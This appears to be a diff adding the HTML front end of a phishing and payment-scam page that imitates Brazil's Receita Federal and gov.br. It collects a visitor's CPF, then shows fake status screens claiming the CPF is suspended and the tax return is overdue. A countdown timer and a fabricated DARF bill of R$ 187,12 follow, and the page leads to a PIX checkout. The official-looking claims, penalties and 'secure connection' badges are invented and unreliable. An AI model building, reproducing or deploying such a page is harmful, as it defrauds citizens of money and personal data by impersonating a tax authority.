@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meu Imposto de Renda - Receita Federal</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <img src="gov-br-logo.svg" alt="gov.br" class="header-logo">
+            <div class="header-right">
+                <div class="notification-icon">
+                    <i class="fas fa-bell"></i>
+                </div>
+                <div class="user-avatar">
+                    <i class="fas fa-user"></i>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        
+        <!-- Screen 1: Login/Acesso Inicial -->
+        <div id="screen1" class="screen active">
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="login-title">CPF Brasil</h2>
+                    <p class="login-subtitle">Receita Federal do Brasil</p>
+                </div>
+                <div class="card-body">
+                    <div class="agreement-box">
+                        <i class="fas fa-shield-alt"></i>
+                        <p>Ao prosseguir, você concorda com nossos <a href="#" target="_blank">Termos de Uso</a> e <a href="#" target="_blank">Política de Privacidade</a>.</p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="cpf">Digite seu CPF para acessar</label>
+                        <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
+                    </div>
+                    
+                    <button class="btn-primary" onclick="proceedToScreen2()">
+                        ENTRAR COM GOV.BR
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+                <div class="card-footer">
+                    <div class="security-message">
+                        <i class="fas fa-lock"></i>
+                        <span>Conexão segura</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 2: Carregamento de Dados -->
+        <div id="screen2" class="screen">
+            <div class="card">
+                <div class="card-body">
+                    <div class="loading-spinner"></div>
+                    <h3 class="loading-text">Consultando seu CPF na Receita Federal</h3>
+                    <p class="loading-subtitle">Por favor, aguarde enquanto verificamos seus dados...</p>
+                    
+                    <div class="status-list">
+                        <div class="status-item active">
+                            <div class="status-dot"></div>
+                            <span class="status-text">Conectando com a base de dados</span>
+                        </div>
+                        <div class="status-item">
+                            <div class="status-dot"></div>
+                            <span class="status-text">Validando informações pessoais</span>
+                        </div>
+                        <div class="status-item">
+                            <div class="status-dot"></div>
+                            <span class="status-text">Preparando resultado</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <div class="security-message">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Seus dados estão sendo processados de forma segura e confidencial.</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 3: Status Crítico -->
+        <div id="screen3" class="screen">
+            <div class="alert-bar">
+                STATUS CRÍTICO: REGULARIZAÇÃO NECESSÁRIA
+            </div>
+
+            <div class="card">
+                <div class="card-body">
+                    <div class="user-info">
+                        <div class="user-avatar-large user-avatar">C</div>
+                        <div class="user-details">
+                            <h3 class="user-name">Carlos Henrique de Souza</h3>
+                            <p class="cpf-number">CPF: 123.456.789-00</p>
+                        </div>
+                    </div>
+
+                    <div class="data-sections">
+                        <div class="data-item">
+                            <i class="fas fa-calendar"></i>
+                            <div class="data-item-content">
+                                <h4>Data de Nascimento</h4>
+                                <p class="birth-date">15/03/1985</p>
+                            </div>
+                        </div>
+                        <div class="data-item">
+                            <i class="fas fa-user-check"></i>
+                            <div class="data-item-content">
+                                <h4>Situação Cadastral</h4>
+                                <p>IRREGULAR</p>
+                            </div>
+                        </div>
+                        <div class="data-item">
+                            <i class="fas fa-file-alt"></i>
+                            <div class="data-item-content">
+                                <h4>Declaração IR 2023</h4>
+                                <p>NÃO ENTREGUE</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="protocol-section">
+                        <div class="protocol-info">
+                            <a href="#" class="protocol-number">Protocolo: CTPS485364</a>
+                            <span>Prazo Final: <span class="due-date">--/--/----</span></span>
+                        </div>
+                        <div class="status-badge">CRÍTICO</div>
+                    </div>
+                    
+                    <div class="irregularity-card">
+                        <h4><i class="fas fa-exclamation-triangle"></i> Irregularidade Detectada</h4>
+                        <ul class="irregularity-list">
+                            <li>Dados inconsistentes na declaração</li>
+                            <li>Atraso na entrega da declaração de IR</li>
+                            <li>CPF (SUSPENSO)</li>
+                        </ul>
+                        <p><strong>Base Legal:</strong> Lei 9.430/96, art. 71</p>
+                    </div>
+
+                    <div class="consequences-card">
+                        <h4><i class="fas fa-list"></i> Consequências Imediatas</h4>
+                        <ul class="consequences-list">
+                            <li><i class="fas fa-ban"></i> Multa de R$ 187,12</li>
+                            <li><i class="fas fa-ban"></i> Bloqueio de CPF</li>
+                            <li><i class="fas fa-ban"></i> Suspensão de benefícios</li>
+                            <li><i class="fas fa-ban"></i> Restrição a serviços públicos</li>
+                        </ul>
+                    </div>
+
+                    <button class="btn-primary" onclick="proceedToScreen4()">
+                        REGULARIZAR AGORA
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="countdown-section">
+                <div class="countdown-title">Tempo Restante para Regularização</div>
+                <div class="countdown-timer">
+                    <span id="hours">--</span>:<span id="minutes">--</span>:<span id="seconds">--</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 4: Carregamento de Pagamento -->
+        <div id="screen4" class="screen">
+            <div class="card">
+                <div class="card-body">
+                    <div class="loading-spinner"></div>
+                    <h3 class="loading-text">Carregando informações de pagamento...</h3>
+                    <p class="loading-subtitle">Verificando dados bancários... Processando DARF...</p>
+                    
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 60%"></div>
+                    </div>
+
+                    <div class="progress-steps">
+                        <div class="progress-step completed">
+                            <div class="progress-step-icon">
+                                <i class="fas fa-check"></i>
+                            </div>
+                            <span class="progress-step-text">Seguro</span>
+                        </div>
+                        <div class="progress-step active">
+                            <div class="progress-step-icon">
+                                <i class="fas fa-university"></i>
+                            </div>
+                            <span class="progress-step-text">Criptografado</span>
+                        </div>
+                        <div class="progress-step">
+                            <div class="progress-step-icon">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <span class="progress-step-text">Verificado</span>
+                        </div>
+                    </div>
+
+                    <div class="payment-steps">
+                        <div class="payment-step">
+                            <i class="fas fa-credit-card"></i>
+                            <div class="payment-step-content">
+                                <h4>Validando Pagamento</h4>
+                                <p>Verificando informações do DARF</p>
+                            </div>
+                        </div>
+                        <div class="payment-step active">
+                            <i class="fas fa-university"></i>
+                            <div class="payment-step-content">
+                                <h4>Conectando com Banco</h4>
+                                <p>Estabelecendo conexão segura</p>
+                            </div>
+                        </div>
+                        <div class="payment-step">
+                            <i class="fas fa-file-invoice"></i>
+                            <div class="payment-step-content">
+                                <h4>Gerando Guia de Pagamento</h4>
+                                <p>Preparando forma de pagamento</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 5: DARF -->
+        <div id="screen5" class="screen">
+            <div class="card">
+                <div class="card-body">
+                    <div class="darf-header">
+                        <h2><i class="fas fa-file-alt"></i> DARF - Documento de Arrecadação de Receitas Federais</h2>
+                        <p>Protocolo: CTPS485364</p>
+                    </div>
+
+                    <div class="darf-details">
+                        <div class="darf-detail-row">
+                            <span class="darf-label">Nome do Contribuinte:</span>
+                            <span class="darf-value user-name">Carlos Henrique de Souza</span>
+                        </div>
+                        <div class="darf-detail-row">
+                            <span class="darf-label">CPF/CNPJ:</span>
+                            <span class="darf-value cpf-number">123.456.789-00</span>
+                        </div>
+                        <div class="darf-detail-row">
+                            <span class="darf-label">Código da Receita:</span>
+                            <span class="darf-value">0561</span>
+                        </div>
+                        <div class="darf-detail-row">
+                            <span class="darf-label">Período de Apuração:</span>
+                            <span class="darf-value">01/2023 a 12/2023</span>
+                        </div>
+                        <div class="darf-detail-row">
+                            <span class="darf-label">Data de Vencimento:</span>
+                            <span class="darf-value due-date" style="color: var(--danger-red); font-weight: 700;">--/--/----</span>
+                        </div>
+                        <div class="darf-detail-row">
+                            <span class="darf-label">Número de Referência:</span>
+                            <span class="darf-value">CTPS485364</span>
+                        </div>
+                    </div>
+
+                    <div class="darf-table">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Discriminação</th>
+                                    <th>Valor (R$)</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Valor Principal</td>
+                                    <td class="value-cell">150,00</td>
+                                </tr>
+                                <tr>
+                                    <td>Multa</td>
+                                    <td class="value-cell penalty-cell">25,00</td>
+                                </tr>
+                                <tr>
+                                    <td>Juros</td>
+                                    <td class="value-cell interest-cell">12,12</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>VALOR A PAGAR</strong></td>
+                                    <td class="value-cell"><strong>187,12</strong></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="darf-total">
+                        <h3>R$ 187,12</h3>
+                        <p>VALOR TOTAL A PAGAR</p>
+                    </div>
+
+                    <div class="darf-warning">
+                        <h4><i class="fas fa-exclamation-triangle"></i> Aviso Importante</h4>
+                        <p>O não pagamento até a data de vencimento acarretará acréscimo de multa, juros de mora e inscrição em Dívida Ativa da União, conforme legislação vigente.</p>
+                    </div>
+
+                    <button class="btn-primary" onclick="proceedToScreen6()">
+                        EMITIR GUIA DE PAGAMENTO
+                        <i class="fas fa-file-invoice"></i>
+                    </button>
+                    
+                    <div class="darf-footer">
+                        <p>Documento gerado eletronicamente</p>
+                        <a href="#" target="_blank">Código de Autenticação</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 6: PIX Loading -->
+        <div id="screen6" class="screen">
+            <div class="card">
+                <div class="card-body">
+                    <div class="loading-spinner"></div>
+                    <h3 class="loading-text">Carregando Informações de Pagamento</h3>
+                    <p class="loading-subtitle">Preparando método de pagamento... Aguarde alguns instantes</p>
+                    
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 100%"></div>
+                    </div>
+
+                    <div class="progress-steps">
+                        <div class="progress-step completed">
+                            <div class="progress-step-icon">
+                                <i class="fas fa-check"></i>
+                            </div>
+                            <span class="progress-step-text">Seguro</span>
+                        </div>
+                        <div class="progress-step completed">
+                            <div class="progress-step-icon">
+                                <i class="fas fa-check"></i>
+                            </div>
+                            <span class="progress-step-text">Criptografado</span>
+                        </div>
+                        <div class="progress-step active">
+                            <div class="progress-step-icon">
+                                <i class="fas fa-external-link-alt"></i>
+                            </div>
+                            <span class="progress-step-text">Verificado</span>
+                        </div>
+                    </div>
+
+                    <div class="payment-steps">
+                        <div class="payment-step completed">
+                            <i class="fas fa-credit-card"></i>
+                            <div class="payment-step-content">
+                                <h4>Validando Pagamento</h4>
+                                <p>Verificando informações do DARF</p>
+                            </div>
+                        </div>
+                        <div class="payment-step completed">
+                            <i class="fas fa-university"></i>
+                            <div class="payment-step-content">
+                                <h4>Conectando com Banco</h4>
+                                <p>Estabelecendo conexão segura</p>
+                            </div>
+                        </div>
+                        <div class="payment-step active">
+                            <i class="fas fa-external-link-alt"></i>
+                            <div class="payment-step-content">
+                                <h4>Preparando Checkout</h4>
+                                <p>Redirecionando para pagamento seguro</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <script src="script.js"></script>
+</body>
+</html>
